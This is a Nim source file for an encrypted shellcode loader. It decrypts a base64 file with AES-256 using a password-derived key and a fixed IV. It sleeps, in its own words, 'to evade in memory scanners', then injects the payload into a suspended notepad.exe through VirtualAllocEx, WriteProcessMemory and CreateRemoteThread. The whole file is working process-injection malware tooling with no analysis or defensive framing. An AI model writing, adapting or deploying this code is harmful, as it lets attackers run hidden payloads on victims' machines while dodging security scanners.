import winim/lean
import osproc
import os
import strformat
import dynlib
import base64
import nimcrypto
import nimcrypto/sysrand

proc injectCreateRemoteThread[byte](shellcode: openArray[byte]): void =

    let tProcess = startProcess("notepad.exe")
    tProcess.suspend() 
    defer: tProcess.close()

    echo "[*] Target Process: ", tProcess.processID

    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS, 
        false, 
        cast[DWORD](tProcess.processID)
    )
    defer: CloseHandle(pHandle)

    echo "[*] pHandle: ", pHandle

    let rPtr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    var bytesWritten: SIZE_T
    let wSuccess = WriteProcessMemory(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    echo "[*] WriteProcessMemory: ", bool(wSuccess)
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let tHandle = CreateRemoteThread(
        pHandle, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](rPtr),
        NULL, 
        0, 
        NULL
    )
    defer: CloseHandle(tHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"


when isMainModule:
    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))
    let
        password: string = paramStr(1)
        inFile: string = paramStr(2)
    var
        inFileContents: string = readFile(inFile)
        encrypted: seq[byte] = toByteSeq(decode(inFileContents))
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        decrypted: seq[byte] = newSeq[byte](len(encrypted))
    # Create Static IV
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]

    # Expand key to 32 bytes using SHA256 as the KDF
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
    echo fmt"[*] Sleeping to evade in memory scanners"
    sleep(18000)
    echo fmt"[*] Decrypting {inFile} using password: {password}"

    dctx.init(key, iv)
    dctx.decrypt(encrypted, decrypted)
    dctx.clear()
    
    injectCreateRemoteThread(decrypted)
